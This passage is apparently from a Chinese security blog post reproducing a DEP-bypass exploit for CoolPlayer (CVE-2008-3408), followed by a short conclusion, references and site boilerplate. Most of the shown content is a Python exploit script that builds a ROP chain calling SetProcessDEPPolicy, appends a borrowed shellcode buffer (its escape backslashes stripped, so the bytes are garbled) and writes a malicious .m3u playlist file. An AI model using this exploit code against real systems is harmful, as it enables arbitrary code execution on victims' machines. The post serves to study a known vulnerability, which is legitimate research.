+    ROP += struct.pack('<L',0xFFFFFFFF) # PARAMETER 0x00000000 - 0x1 = 0xFFFFFFFF
+    ROP += struct.pack('<L',0x5d184ec0) # INC EBX / RET
+    ROP += struct.pack('<L',0x77119293) # POP EBP / RET
+    ROP += struct.pack('<L',0x7C862144) # <- SetProcessDEPPolicy
+    ROP += struct.pack('<L',0x77114aa1) # POP EDI / RET
+    ROP += struct.pack('<L',0x77d148c0) # RET
+    ROP += struct.pack('<L',0x77112362) # POP ESI  / RET
+    ROP += struct.pack('<L',0x77d148c0) # RET
+    ROP += struct.pack('<L',0x77118cf7) # PUSHAD / RET
+    
+    buf = "xebx14x58xb2xbfx8ax18x32xdax88x18x40x81x38xfdxfdxfdxfdx75xf1xeb" 
+    buf += "x05xe8xe7xffxffxffx43xd7xd5xb5x87xa1xd7xdcx36x6exf0xd7x8dxcbx2e" 
+    buf += "xb3x34x4bx32xc1x4bx8cx64x08xbbx94x5cxd9x04x8cx8dxecxd7xcaxccxda" 
+    buf += "xcdxebx8cx6dxdbx34xe5x8fx34xf4xb3x34xf6xa3x34xb6x34xd6xb7x12x82" 
+    buf += "xd5xb5x87xa1xcaxbax2ax40xe8x47x2axdfx34xfax83x34xf3xbaxc7xbcx72" 
+    buf += "x34xe6x9fxbcx62x8cx40xf8x34x8bx04xbcx4ax26xb0x01xb9x85x7bxcbxb7" 
+    buf += "x7ex75xb8xbcx6fxf9x54x4ex84xebx9bxa3xcax5bx34xe6x9bxbcx62xd9x34" 
+    buf += "x83xc4x34xe6xa3xbcx62xbcx93x04x2axe0x14xe8xdex82xd5xb5x87xa1xca" 
+    buf += "x16x8cx64xecxd7xdbxddxd8xbfxd7xc8xd6xd1xd8x34x7bxecxefxefxecx40" 
+    buf +=  "xe8x43xecx40xe8x47xfdxfdxfdxfd"
+    
+    
+    file = open("setdeppolicy_bypass.m3u","w")
+    file.write(dump + ROP + buf)
+    file.close()
+    
+
+其中`shellcode`是从网上找的看雪[wingdbg](https://bbs.pediy.com/user-387462.htm)版主的，因为利用`msfvenom`生成的各种`shellcodde`长度都过长，导致被截断
+
+![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CoolPlayer%20bypass%20DEP%20CVE-2008-3408%E5%88%86%E6%9E%90/1544094464689.png)
+
+## 总结
+
+`shellcode`如果出错的话，分析起来会比较难，而且不容易发现出错点，但是感觉收获也会特别大。
+
+由于能力有限，难免会有错误，欢迎批评指正，有改进也非常好。
+
+## 参考
+
+[exploitdb](https://www.exploit-db.com/exploits/15895)
+
+[维基百科](https://zh.wikipedia.org/wiki/M3U)
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **xina1i** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/167424](/post/id/167424)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [漏洞分析](/tag/漏洞分析)
+  * [CoolPlayer](/tag/CoolPlayer)
+
+ **+1** __4赞
+
+ __收藏
+
+![](https://p1.ssl.qhimg.com/t01694aa89d72cc3370.png) xina1i
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
